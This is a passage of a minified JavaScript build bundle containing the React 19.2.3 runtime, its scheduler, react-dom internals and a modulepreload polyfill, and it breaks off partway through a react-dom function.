function Tx(o,u){for(var d=0;d<u.length;d++){const r=u[d];if(typeof r!="string"&&!Array.isArray(r)){for(const f in r)if(f!=="default"&&!(f in o)){const p=Object.getOwnPropertyDescriptor(r,f);p&&Object.defineProperty(o,f,p.get?p:{enumerable:!0,get:()=>r[f]})}}}return Object.freeze(Object.defineProperty(o,Symbol.toStringTag,{value:"Module"}))}(function(){const u=document.createElement("link").relList;if(u&&u.supports&&u.supports("modulepreload"))return;for(const f of document.querySelectorAll('link[rel="modulepreload"]'))r(f);new MutationObserver(f=>{for(const p of f)if(p.type==="childList")for(const x of p.addedNodes)x.tagName==="LINK"&&x.rel==="modulepreload"&&r(x)}).observe(document,{childList:!0,subtree:!0});function d(f){const p={};return f.integrity&&(p.integrity=f.integrity),f.referrerPolicy&&(p.referrerPolicy=f.referrerPolicy),f.crossOrigin==="use-credentials"?p.credentials="include":f.crossOrigin==="anonymous"?p.credentials="omit":p.credentials="same-origin",p}function r(f){if(f.ep)return;f.ep=!0;const p=d(f);fetch(f.href,p)}})();function Ex(o){return o&&o.__esModule&&Object.prototype.hasOwnProperty.call(o,"default")?o.default:o}var lc={exports:{}},In={};var _h;function Nx(){if(_h)return In;_h=1;var o=Symbol.for("react.transitional.element"),u=Symbol.for("react.fragment");function d(r,f,p){var x=null;if(p!==void 0&&(x=""+p),f.key!==void 0&&(x=""+f.key),"key"in f){p={};for(var v in f)v!=="key"&&(p[v]=f[v])}else p=f;return f=p.ref,{$$typeof:o,type:r,key:x,ref:f!==void 0?f:null,props:p}}return In.Fragment=u,In.jsx=d,In.jsxs=d,In}var zh;function jx(){return zh||(zh=1,lc.exports=Nx()),lc.exports}var i=jx(),ac={exports:{}},ne={};var Oh;function Cx(){if(Oh)return ne;Oh=1;var o=Symbol.for("react.transitional.element"),u=Symbol.for("react.portal"),d=Symbol.for("react.fragment"),r=Symbol.for("react.strict_mode"),f=Symbol.for("react.profiler"),p=Symbol.for("react.consumer"),x=Symbol.for("react.context"),v=Symbol.for("react.forward_ref"),g=Symbol.for("react.suspense"),m=Symbol.for("react.memo"),T=Symbol.for("react.lazy"),A=Symbol.for("react.activity"),z=Symbol.iterator;function V(S){return S===null||typeof S!="object"?null:(S=z&&S[z]||S["@@iterator"],typeof S=="function"?S:null)}var q={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},L=Object.assign,H={};function Z(S,O,B){this.props=S,this.context=O,this.refs=H,this.updater=B||q}Z.prototype.isReactComponent={},Z.prototype.setState=function(S,O){if(typeof S!="object"&&typeof S!="function"&&S!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,S,O,"setState")},Z.prototype.forceUpdate=function(S){this.updater.enqueueForceUpdate(this,S,"forceUpdate")};function I(){}I.prototype=Z.prototype;function J(S,O,B){this.props=S,this.context=O,this.refs=H,this.updater=B||q}var se=J.prototype=new I;se.constructor=J,L(se,Z.prototype),se.isPureReactComponent=!0;var ee=Array.isArray;function ue(){}var F={H:null,A:null,T:null,S:null},P=Object.prototype.hasOwnProperty;function Ee(S,O,B){var Y=B.ref;return{$$typeof:o,type:S,key:O,ref:Y!==void 0?Y:null,props:B}}function ht(S,O){return Ee(S.type,O,S.props)}function nt(S){return typeof S=="object"&&S!==null&&S.$$typeof===o}function Ue(S){var O={"=":"=0",":":"=2"};return"$"+S.replace(/[=:]/g,function(B){return O[B]})}var pt=/\/+/g;function tt(S,O){return typeof S=="object"&&S!==null&&S.key!=null?Ue(""+S.key):O.toString(36)}function we(S){switch(S.status){case"fulfilled":return S.value;case"rejected":throw S.reason;default:switch(typeof S.status=="string"?S.then(ue,ue):(S.status="pending",S.then(function(O){S.status==="pending"&&(S.status="fulfilled",S.value=O)},function(O){S.status==="pending"&&(S.status="rejected",S.reason=O)})),S.status){case"fulfilled":return S.value;case"rejected":throw S.reason}}throw S}function M(S,O,B,Y,ae){var re=typeof S;(re==="undefined"||re==="boolean")&&(S=null);var le=!1;if(S===null)le=!0;else switch(re){case"bigint":case"string":case"number":le=!0;break;case"object":switch(S.$$typeof){case o:case u:le=!0;break;case T:return le=S._init,M(le(S._payload),O,B,Y,ae)}}if(le)return ae=ae(S),le=Y===""?"."+tt(S,0):Y,ee(ae)?(B="",le!=null&&(B=le.replace(pt,"$&/")+"/"),M(ae,O,B,"",function(qt){return qt})):ae!=null&&(nt(ae)&&(ae=ht(ae,B+(ae.key==null||S&&S.key===ae.key?"":(""+ae.key).replace(pt,"$&/")+"/")+le)),O.push(ae)),1;le=0;var Ke=Y===""?".":Y+":";if(ee(S))for(var De=0;De<S.length;De++)Y=S[De],re=Ke+tt(Y,De),le+=M(Y,O,B,re,ae);else if(De=V(S),typeof De=="function")for(S=De.call(S),De=0;!(Y=S.next()).done;)Y=Y.value,re=Ke+tt(Y,De++),le+=M(Y,O,B,re,ae);else if(re==="object"){if(typeof S.then=="function")return M(we(S),O,B,Y,ae);throw O=String(S),Error("Objects are not valid as a React child (found: "+(O==="[object Object]"?"object with keys {"+Object.keys(S).join(", ")+"}":O)+"). If you meant to render a collection of children, use an array instead.")}return le}function G(S,O,B){if(S==null)return S;var Y=[],ae=0;return M(S,Y,"","",function(re){return O.call(B,re,ae++)}),Y}function U(S){if(S._status===-1){var O=S._result;O=O(),O.then(function(B){(S._status===0||S._status===-1)&&(S._status=1,S._result=B)},function(B){(S._status===0||S._status===-1)&&(S._status=2,S._result=B)}),S._status===-1&&(S._status=0,S._result=O)}if(S._status===1)return S._result.default;throw S._result}var ve=typeof reportError=="function"?reportError:function(S){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var O=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof S=="object"&&S!==null&&typeof S.message=="string"?String(S.message):String(S),error:S});if(!window.dispatchEvent(O))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",S);return}console.error(S)},Se={map:G,forEach:function(S,O,B){G(S,function(){O.apply(this,arguments)},B)},count:function(S){var O=0;return G(S,function(){O++}),O},toArray:function(S){return G(S,function(O){return O})||[]},only:function(S){if(!nt(S))throw Error("React.Children.only expected to receive a single React element child.");return S}};return ne.Activity=A,ne.Children=Se,ne.Component=Z,ne.Fragment=d,ne.Profiler=f,ne.PureComponent=J,ne.StrictMode=r,ne.Suspense=g,ne.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=F,ne.__COMPILER_RUNTIME={__proto__:null,c:function(S){return F.H.useMemoCache(S)}},ne.cache=function(S){return function(){return S.apply(null,arguments)}},ne.cacheSignal=function(){return null},ne.cloneElement=function(S,O,B){if(S==null)throw Error("The argument must be a React element, but you passed "+S+".");var Y=L({},S.props),ae=S.key;if(O!=null)for(re in O.key!==void 0&&(ae=""+O.key),O)!P.call(O,re)||re==="key"||re==="__self"||re==="__source"||re==="ref"&&O.ref===void 0||(Y[re]=O[re]);var re=arguments.length-2;if(re===1)Y.children=B;else if(1<re){for(var le=Array(re),Ke=0;Ke<re;Ke++)le[Ke]=arguments[Ke+2];Y.children=le}return Ee(S.type,ae,Y)},ne.createContext=function(S){return S={$$typeof:x,_currentValue:S,_currentValue2:S,_threadCount:0,Provider:null,Consumer:null},S.Provider=S,S.Consumer={$$typeof:p,_context:S},S},ne.createElement=function(S,O,B){var Y,ae={},re=null;if(O!=null)for(Y in O.key!==void 0&&(re=""+O.key),O)P.call(O,Y)&&Y!=="key"&&Y!=="__self"&&Y!=="__source"&&(ae[Y]=O[Y]);var le=arguments.length-2;if(le===1)ae.children=B;else if(1<le){for(var Ke=Array(le),De=0;De<le;De++)Ke[De]=arguments[De+2];ae.children=Ke}if(S&&S.defaultProps)for(Y in le=S.defaultProps,le)ae[Y]===void 0&&(ae[Y]=le[Y]);return Ee(S,re,ae)},ne.createRef=function(){return{current:null}},ne.forwardRef=function(S){return{$$typeof:v,render:S}},ne.isValidElement=nt,ne.lazy=function(S){return{$$typeof:T,_payload:{_status:-1,_result:S},_init:U}},ne.memo=function(S,O){return{$$typeof:m,type:S,compare:O===void 0?null:O}},ne.startTransition=function(S){var O=F.T,B={};F.T=B;try{var Y=S(),ae=F.S;ae!==null&&ae(B,Y),typeof Y=="object"&&Y!==null&&typeof Y.then=="function"&&Y.then(ue,ve)}catch(re){ve(re)}finally{O!==null&&B.types!==null&&(O.types=B.types),F.T=O}},ne.unstable_useCacheRefresh=function(){return F.H.useCacheRefresh()},ne.use=function(S){return F.H.use(S)},ne.useActionState=function(S,O,B){return F.H.useActionState(S,O,B)},ne.useCallback=function(S,O){return F.H.useCallback(S,O)},ne.useContext=function(S){return F.H.useContext(S)},ne.useDebugValue=function(){},ne.useDeferredValue=function(S,O){return F.H.useDeferredValue(S,O)},ne.useEffect=function(S,O){return F.H.useEffect(S,O)},ne.useEffectEvent=function(S){return F.H.useEffectEvent(S)},ne.useId=function(){return F.H.useId()},ne.useImperativeHandle=function(S,O,B){return F.H.useImperativeHandle(S,O,B)},ne.useInsertionEffect=function(S,O){return F.H.useInsertionEffect(S,O)},ne.useLayoutEffect=function(S,O){return F.H.useLayoutEffect(S,O)},ne.useMemo=function(S,O){return F.H.useMemo(S,O)},ne.useOptimistic=function(S,O){return F.H.useOptimistic(S,O)},ne.useReducer=function(S,O,B){return F.H.useReducer(S,O,B)},ne.useRef=function(S){return F.H.useRef(S)},ne.useState=function(S){return F.H.useState(S)},ne.useSyncExternalStore=function(S,O,B){return F.H.useSyncExternalStore(S,O,B)},ne.useTransition=function(){return F.H.useTransition()},ne.version="19.2.3",ne}var kh;function vc(){return kh||(kh=1,ac.exports=Cx()),ac.exports}var N=vc();const wx=Ex(N),Rx=Tx({__proto__:null,default:wx},[N]);var nc={exports:{}},$n={},sc={exports:{}},oc={};var Hh;function Mx(){return Hh||(Hh=1,(function(o){function u(M,G){var U=M.length;M.push(G);e:for(;0<U;){var ve=U-1>>>1,Se=M[ve];if(0<f(Se,G))M[ve]=G,M[U]=Se,U=ve;else break e}}function d(M){return M.length===0?null:M[0]}function r(M){if(M.length===0)return null;var G=M[0],U=M.pop();if(U!==G){M[0]=U;e:for(var ve=0,Se=M.length,S=Se>>>1;ve<S;){var O=2*(ve+1)-1,B=M[O],Y=O+1,ae=M[Y];if(0>f(B,U))Y<Se&&0>f(ae,B)?(M[ve]=ae,M[Y]=U,ve=Y):(M[ve]=B,M[O]=U,ve=O);else if(Y<Se&&0>f(ae,U))M[ve]=ae,M[Y]=U,ve=Y;else break e}}return G}function f(M,G){var U=M.sortIndex-G.sortIndex;return U!==0?U:M.id-G.id}if(o.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var p=performance;o.unstable_now=function(){return p.now()}}else{var x=Date,v=x.now();o.unstable_now=function(){return x.now()-v}}var g=[],m=[],T=1,A=null,z=3,V=!1,q=!1,L=!1,H=!1,Z=typeof setTimeout=="function"?setTimeout:null,I=typeof clearTimeout=="function"?clearTimeout:null,J=typeof setImmediate<"u"?setImmediate:null;function se(M){for(var G=d(m);G!==null;){if(G.callback===null)r(m);else if(G.startTime<=M)r(m),G.sortIndex=G.expirationTime,u(g,G);else break;G=d(m)}}function ee(M){if(L=!1,se(M),!q)if(d(g)!==null)q=!0,ue||(ue=!0,Ue());else{var G=d(m);G!==null&&we(ee,G.startTime-M)}}var ue=!1,F=-1,P=5,Ee=-1;function ht(){return H?!0:!(o.unstable_now()-Ee<P)}function nt(){if(H=!1,ue){var M=o.unstable_now();Ee=M;var G=!0;try{e:{q=!1,L&&(L=!1,I(F),F=-1),V=!0;var U=z;try{t:{for(se(M),A=d(g);A!==null&&!(A.expirationTime>M&&ht());){var ve=A.callback;if(typeof ve=="function"){A.callback=null,z=A.priorityLevel;var Se=ve(A.expirationTime<=M);if(M=o.unstable_now(),typeof Se=="function"){A.callback=Se,se(M),G=!0;break t}A===d(g)&&r(g),se(M)}else r(g);A=d(g)}if(A!==null)G=!0;else{var S=d(m);S!==null&&we(ee,S.startTime-M),G=!1}}break e}finally{A=null,z=U,V=!1}G=void 0}}finally{G?Ue():ue=!1}}}var Ue;if(typeof J=="function")Ue=function(){J(nt)};else if(typeof MessageChannel<"u"){var pt=new MessageChannel,tt=pt.port2;pt.port1.onmessage=nt,Ue=function(){tt.postMessage(null)}}else Ue=function(){Z(nt,0)};function we(M,G){F=Z(function(){M(o.unstable_now())},G)}o.unstable_IdlePriority=5,o.unstable_ImmediatePriority=1,o.unstable_LowPriority=4,o.unstable_NormalPriority=3,o.unstable_Profiling=null,o.unstable_UserBlockingPriority=2,o.unstable_cancelCallback=function(M){M.callback=null},o.unstable_forceFrameRate=function(M){0>M||125<M?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):P=0<M?Math.floor(1e3/M):5},o.unstable_getCurrentPriorityLevel=function(){return z},o.unstable_next=function(M){switch(z){case 1:case 2:case 3:var G=3;break;default:G=z}var U=z;z=G;try{return M()}finally{z=U}},o.unstable_requestPaint=function(){H=!0},o.unstable_runWithPriority=function(M,G){switch(M){case 1:case 2:case 3:case 4:case 5:break;default:M=3}var U=z;z=M;try{return G()}finally{z=U}},o.unstable_scheduleCallback=function(M,G,U){var ve=o.unstable_now();switch(typeof U=="object"&&U!==null?(U=U.delay,U=typeof U=="number"&&0<U?ve+U:ve):U=ve,M){case 1:var Se=-1;break;case 2:Se=250;break;case 5:Se=1073741823;break;case 4:Se=1e4;break;default:Se=5e3}return Se=U+Se,M={id:T++,callback:G,priorityLevel:M,startTime:U,expirationTime:Se,sortIndex:-1},U>ve?(M.sortIndex=U,u(m,M),d(g)===null&&M===d(m)&&(L?(I(F),F=-1):L=!0,we(ee,U-ve))):(M.sortIndex=Se,u(g,M),q||V||(q=!0,ue||(ue=!0,Ue()))),M},o.unstable_shouldYield=ht,o.unstable_wrapCallback=function(M){var G=z;return function(){var U=z;z=G;try{return M.apply(this,arguments)}finally{z=U}}}})(oc)),oc}var Lh;function Dx(){return Lh||(Lh=1,sc.exports=Mx()),sc.exports}var ic={exports:{}},lt={};var Uh;function _x(){if(Uh)return lt;Uh=1;var o=vc();function u(g){var m="https://react.dev/errors/"+g;if(1<arguments.length){m+="?args[]="+encodeURIComponent(arguments[1]);for(var T=2;T<arguments.length;T++)m+="&args[]="+encodeURIComponent(arguments[T])}return"Minified React error #"+g+"; visit "+m+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function d(){}var r={d:{f:d,r:function(){throw Error(u(522))},D:d,C:d,L:d,m:d,X:d,S:d,M:d},p:0,findDOMNode:null},f=Symbol.for("react.portal");function p(g,m,T){var A=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:f,key:A==null?null:""+A,children:g,containerInfo:m,implementation:T}}var x=o.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function v(g,m){if(g==="font")return"";if(typeof m=="string")return m==="use-credentials"?m:""}return lt.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=r,lt.createPortal=function(g,m){var T=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!m||m.nodeType!==1&&m.nodeType!==9&&m.nodeType!==11)throw Error(u(299));return p(g,m,null,T)},lt.flushSync=function(g){var m=x.T,T=r.p;try{if(x.T=null,r.p=2,g)return g()}finally{x.T=m,r.p=T,r.d.f()}},lt.preconnect=function(g,m){typeof g=="string"&&(m?(m=m.crossOrigin,m=typeof m=="string"?m==="use-credentials"?m:"":void 0):m=null,r.d.C(g,m))},lt.prefetchDNS=function(g){typeof g=="string"&&r.d.D(g)},lt.preinit=function(g,m){if(typeof g=="string"&&m&&typeof m.as=="string"){var T=m.as,A=v(T,m.crossOrigin),z=typeof m.integrity=="string"?m.integrity:void 0,V=typeof m.fetchPriority=="string"?m.fetchPriority:void 0;T==="style"?r.d.S(g,typeof m.precedence=="string"?m.precedence:void 0,{crossOrigin:A,integrity:z,fetchPriority:V}):T==="script"&&r.d.X(g,{crossOrigin:A,integrity:z,fetchPriority:V,nonce:typeof m.nonce=="string"?m.nonce:void 0})}},lt.preinitModule=function(g,m){if(typeof g=="string")if(typeof m=="object"&&m!==null){if(m.as==null||m.as==="script"){var T=v(m.as,m.crossOrigin);r.d.M(g,{crossOrigin:T,integrity:typeof m.integrity=="string"?m.integrity:void 0,nonce:typeof m.nonce=="string"?m.nonce:void 0})}}else m==null&&r.d.M(g)},lt.preload=function(g,m){if(typeof g=="string"&&typeof m=="object"&&m!==null&&typeof m.as=="string"){var T=m.as,A=v(T,m.crossOrigin);r.d.L(g,T,{crossOrigin:A,integrity:typeof m.integrity=="string"?m.integrity:void 0,nonce:typeof m.nonce=="string"?m.nonce:void 0,type:typeof m.type=="string"?m.type:void 0,fetchPriority:typeof m.fetchPriority=="string"?m.fetchPriority:void 0,referrerPolicy:typeof m.referrerPolicy=="string"?m.referrerPolicy:void 0,imageSrcSet:typeof m.imageSrcSet=="string"?m.imageSrcSet:void 0,imageSizes:typeof m.imageSizes=="string"?m.imageSizes:void 0,media:typeof m.media=="string"?m.media:void 0})}},lt.preloadModule=function(g,m){if(typeof g=="string")if(m){var T=v(m.as,m.crossOrigin);r.d.m(g,{as:typeof m.as=="string"&&m.as!=="script"?m.as:void 0,crossOrigin:T,integrity:typeof m.integrity=="string"?m.integrity:void 0})}else r.d.m(g)},lt.requestFormReset=function(g){r.d.r(g)},lt.unstable_batchedUpdates=function(g,m){return g(m)},lt.useFormState=function(g,m,T){return x.H.useFormState(g,m,T)},lt.useFormStatus=function(){return x.H.useHostTransitionStatus()},lt.version="19.2.3",lt}var Bh;function zx(){if(Bh)return ic.exports;Bh=1;function o(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(o)}catch(u){console.error(u)}}return o(),ic.exports=_x(),ic.exports}var Gh;function Ox(){if(Gh)return $n;Gh=1;var o=Dx(),u=vc(),d=zx();function r(e){var t="https://react.dev/errors/"+e;if(1<arguments.length){t+="?args[]="+encodeURIComponent(arguments[1]);for(var l=2;l<arguments.length;l++)t+="&args[]="+encodeURIComponent(arguments[l])}return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function f(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function p(e){var t=e,l=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do t=e,(t.flags&4098)!==0&&(l=t.return),e=t.return;while(e)}return t.tag===3?l:null}function x(e){if(e.tag===13){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function v(e){if(e.tag===31){var t=e.memoizedState;if(t===null&&(e=e.alternate,e!==null&&(t=e.memoizedState)),t!==null)return t.dehydrated}return null}function g(e){if(p(e)!==e)throw Error(r(188))}function m(e){var t=e.alternate;if(!t){if(t=p(e),t===null)throw Error(r(188));return t!==e?null:e}for(var l=e,a=t;;){var n=l.return;if(n===null)break;var s=n.alternate;if(s===null){if(a=n.return,a!==null){l=a;continue}break}if(n.child===s.child){for(s=n.child;s;){if(s===l)return g(n),e;if(s===a)return g(n),t;s=s.sibling}throw Error(r(188))}if(l.return!==a.return)l=n,a=s;else{for(var c=!1,h=n.child;h;){if(h===l){c=!0,l=n,a=s;break}if(h===a){c=!0,a=n,l=s;break}h=h.sibling}if(!c){for(h=s.child;h;){if(h===l){c=!0,l=s,a=n;break}if(h===a){c=!0,a=s,l=n;break}h=h.sibling}if(!c)throw Error(r(189))}}if(l.alternate!==a)throw Error(r(190))}if(l.tag!==3)throw Error(r(188));return l.stateNode.current===l?e:t}function T(e){var t=e.tag;if(t===5||t===26||t===27||t===6)return e;for(e=e.child;e!==null;){if(t=T(e),t!==null)return t;e=e.sibling}return null}var A=Object.assign,z=Symbol.for("react.element"),V=Symbol.for("react.transitional.element"),q=Symbol.for("react.portal"),L=Symbol.for("react.fragment"),H=Symbol.for("react.strict_mode"),Z=Symbol.for("react.profiler"),I=Symbol.for("react.consumer"),J=Symbol.for("react.context"),se=Symbol.for("react.forward_ref"),ee=Symbol.for("react.suspense"),ue=Symbol.for("react.suspense_list"),F=Symbol.for("react.memo"),P=Symbol.for("react.lazy"),Ee=Symbol.for("react.activity"),ht=Symbol.for("react.memo_cache_sentinel"),nt=Symbol.iterator;function Ue(e){return e===null||typeof e!="object"?null:(e=nt&&e[nt]||e["@@iterator"],typeof e=="function"?e:null)}var pt=Symbol.for("react.client.reference");function tt(e){if(e==null)return null;if(typeof e=="function")return e.$$typeof===pt?null:e.displayName||e.name||null;if(typeof e=="string")return e;switch(e){case L:return"Fragment";case Z:return"Profiler";case H:return"StrictMode";case ee:return"Suspense";case ue:return"SuspenseList";case Ee:return"Activity"}if(typeof e=="object")switch(e.$$typeof){case q:return"Portal";case J:return e.displayName||"Context";case I:return(e._context.displayName||"Context")+".Consumer";case se:var t=e.render;return e=e.displayName,e||(e=t.displayName||t.name||"",e=e!==""?"ForwardRef("+e+")":"ForwardRef"),e;case F:return t=e.displayName||null,t!==null?t:tt(e.type)||"Memo";case P:t=e._payload,e=e._init;try{return tt(e(t))}catch{}}return null}var we=Array.isArray,M=u.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,G=d.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,U={pending:!1,data:null,method:null,action:null},ve=[],Se=-1;function S(e){return{current:e}}function O(e){0>Se||(e.current=ve[Se],ve[Se]=null,Se--)}function B(e,t){Se++,ve[Se]=e.current,e.current=t}var Y=S(null),ae=S(null),re=S(null),le=S(null);function Ke(e,t){switch(B(re,t),B(ae,e),B(Y,null),t.nodeType){case 9:case 11:e=(e=t.documentElement)&&(e=e.namespaceURI)?th(e):0;break;default:if(e=t.tagName,t=t.namespaceURI)t=th(t),e=lh(t,e);else switch(e){case"svg":e=1;break;case"math":e=2;break;default:e=0}}O(Y),B(Y,e)}function De(){O(Y),O(ae),O(re)}function qt(e){e.memoizedState!==null&&B(le,e);var t=Y.current,l=lh(t,e.type);t!==l&&(B(ae,e),B(Y,l))}function bl(e){ae.current===e&&(O(Y),O(ae)),le.current===e&&(O(le),Zn._currentValue=U)}var vl,Mc;function Jl(e){if(vl===void 0)try{throw Error()}catch(l){var t=l.stack.trim().match(/\n( *(at )?)/);vl=t&&t[1]||"",Mc=-1<l.stack.indexOf(`
    at`)?" (<anonymous>)":-1<l.stack.indexOf("@")?"@unknown:0:0":""}return`
`+vl+e+Mc}var Bo=!1;function Go(e,t){if(!e||Bo)return"";Bo=!0;var l=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var a={DetermineComponentFrameRoot:function(){try{if(t){var k=function(){throw Error()};if(Object.defineProperty(k.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(k,[])}catch(R){var w=R}Reflect.construct(e,[],k)}else{try{k.call()}catch(R){w=R}e.call(k.prototype)}}else{try{throw Error()}catch(R){w=R}(k=e())&&typeof k.catch=="function"&&k.catch(function(){})}}catch(R){if(R&&w&&typeof R.stack=="string")return[R.stack,w.stack]}return[null,null]}};a.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var n=Object.getOwnPropertyDescriptor(a.DetermineComponentFrameRoot,"name");n&&n.configurable&&Object.defineProperty(a.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var s=a.DetermineComponentFrameRoot(),c=s[0],h=s[1];if(c&&h){var b=c.split(`
`),C=h.split(`
`);for(n=a=0;a<b.length&&!b[a].includes("DetermineComponentFrameRoot");)a++;for(;n<C.length&&!C[n].includes("DetermineComponentFrameRoot");)n++;if(a===b.length||n===C.length)for(a=b.length-1,n=C.length-1;1<=a&&0<=n&&b[a]!==C[n];)n--;for(;1<=a&&0<=n;a--,n--)if(b[a]!==C[n]){if(a!==1||n!==1)do if(a--,n--,0>n||b[a]!==C[n]){var D=`
`+b[a].replace(" at new "," at ");return e.displayName&&D.includes("<anonymous>")&&(D=D.replace("<anonymous>",e.displayName)),D}while(1<=a&&0<=n);break}}}finally{Bo=!1,Error.prepareStackTrace=l}return(l=e?e.displayName||e.name:"")?Jl(l):""}function em(e,t){switch(e.tag){case 26:case 27:case 5:return Jl(e.type);case 16:return Jl("Lazy");case 13:return e.child!==t&&t!==null?Jl("Suspense Fallback"):Jl("Suspense");case 19:return Jl("SuspenseList");case 0:case 15:return Go(e.type,!1);case 11:return Go(e.type.render,!1);case 1:return Go(e.type,!0);case 31:return Jl("Activity");default:return""}}function Dc(e){try{var t="",l=null;do t+=em(e,l),l=e,e=e.return;while(e);return t}catch(a){return`
Error generating stack: `+a.message+`
`+a.stack}}var qo=Object.prototype.hasOwnProperty,Yo=o.unstable_scheduleCallback,Vo=o.unstable_cancelCallback,tm=o.unstable_shouldYield,lm=o.unstable_requestPaint,mt=o.unstable_now,am=o.unstable_getCurrentPriorityLevel,_c=o.unstable_ImmediatePriority,zc=o.unstable_UserBlockingPriority,cs=o.unstable_NormalPriority,nm=o.unstable_LowPriority,Oc=o.unstable_IdlePriority,sm=o.log,om=o.unstable_setDisableYieldValue,sn=null,gt=null;function yl(e){if(typeof sm=="function"&&om(e),gt&&typeof gt.setStrictMode=="function")try{gt.setStrictMode(sn,e)}catch{}}var xt=Math.clz32?Math.clz32:cm,im=Math.log,rm=Math.LN2;function cm(e){return e>>>=0,e===0?32:31-(im(e)/rm|0)|0}var us=256,ds=262144,fs=4194304;function Wl(e){var t=e&42;if(t!==0)return t;switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return e&261888;case 262144:case 524288:case 1048576:case 2097152:return e&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return e&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return e}}function hs(e,t,l){var a=e.pendingLanes;if(a===0)return 0;var n=0,s=e.suspendedLanes,c=e.pingedLanes;e=e.warmLanes;var h=a&134217727;return h!==0?(a=h&~s,a!==0?n=Wl(a):(c&=h,c!==0?n=Wl(c):l||(l=h&~e,l!==0&&(n=Wl(l))))):(h=a&~s,h!==0?n=Wl(h):c!==0?n=Wl(c):l||(l=a&~e,l!==0&&(n=Wl(l)))),n===0?0:t!==0&&t!==n&&(t&s)===0&&(s=n&-n,l=t&-t,s>=l||s===32&&(l&4194048)!==0)?t:n}function on(e,t){return(e.pendingLanes&~(e.suspendedLanes&~e.pingedLanes)&t)===0}function um(e,t){switch(e){case 1:case 2:case 4:case 8:case 64:return t+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function kc(){var e=fs;return fs<<=1,(fs&62914560)===0&&(fs=4194304),e}function Po(e){for(var t=[],l=0;31>l;l++)t.push(e);return t}function rn(e,t){e.pendingLanes|=t,t!==268435456&&(e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0)}function dm(e,t,l,a,n,s){var c=e.pendingLanes;e.pendingLanes=l,e.suspendedLanes=0,e.pingedLanes=0,e.warmLanes=0,e.expiredLanes&=l,e.entangledLanes&=l,e.errorRecoveryDisabledLanes&=l,e.shellSuspendCounter=0;var h=e.entanglements,b=e.expirationTimes,C=e.hiddenUpdates;for(l=c&~l;0<l;){var D=31-xt(l),k=1<<D;h[D]=0,b[D]=-1;var w=C[D];if(w!==null)for(C[D]=null,D=0;D<w.length;D++){var R=w[D];R!==null&&(R.lane&=-536870913)}l&=~k}a!==0&&Hc(e,a,0),s!==0&&n===0&&e.tag!==0&&(e.suspendedLanes|=s&~(c&~t))}function Hc(e,t,l){e.pendingLanes|=t,e.suspendedLanes&=~t;var a=31-xt(t);e.entangledLanes|=t,e.entanglements[a]=e.entanglements[a]|1073741824|l&261930}function Lc(e,t){var l=e.entangledLanes|=t;for(e=e.entanglements;l;){var a=31-xt(l),n=1<<a;n&t|e[a]&t&&(e[a]|=t),l&=~n}}function Uc(e,t){var l=t&-t;return l=(l&42)!==0?1:Xo(l),(l&(e.suspendedLanes|t))!==0?0:l}function Xo(e){switch(e){case 2:e=1;break;case 8:e=4;break;case 32:e=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:e=128;break;case 268435456:e=134217728;break;default:e=0}return e}function Qo(e){return e&=-e,2<e?8<e?(e&134217727)!==0?32:268435456:8:2}function Bc(){var e=G.p;return e!==0?e:(e=window.event,e===void 0?32:Nh(e.type))}function Gc(e,t){var l=G.p;try{return G.p=e,t()}finally{G.p=l}}var Sl=Math.random().toString(36).slice(2),We="__reactFiber$"+Sl,ot="__reactProps$"+Sl,xa="__reactContainer$"+Sl,Ko="__reactEvents$"+Sl,fm="__reactListeners$"+Sl,hm="__reactHandles$"+Sl,qc="__reactResources$"+Sl,cn="__reactMarker$"+Sl;function Zo(e){delete e[We],delete e[ot],delete e[Ko],delete e[fm],delete e[hm]}function ba(e){var t=e[We];if(t)return t;for(var 